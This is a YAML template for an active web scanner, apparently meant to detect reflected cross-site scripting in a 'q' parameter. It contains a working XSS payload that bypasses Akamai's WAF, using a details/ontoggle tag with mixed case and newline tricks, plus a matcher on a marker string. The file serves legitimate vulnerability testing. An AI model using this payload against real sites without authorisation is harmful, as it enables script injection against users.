id: patt-xss-akamai-01-q
name: 'PATT xss patt-xss-akamai-01 via q'
severity: high
type: active
tags:
  - xss
  - patt
  - wafakamai
description: 'PATT Akamai 28 Oct 2018: %0a + mixed case onToGgle + comma operator. [patt:patt-xss-akamai-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/3%20-%20XSS%20Common%20WAF%20Bypass.md]'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      q:
        - '<dETAILS%0aopen%0aonToGgle%0a=%0aa=nxp0032,a() x>'
    matchers:
      - type: word
        part: body
        words:
          - 'nxp0032'
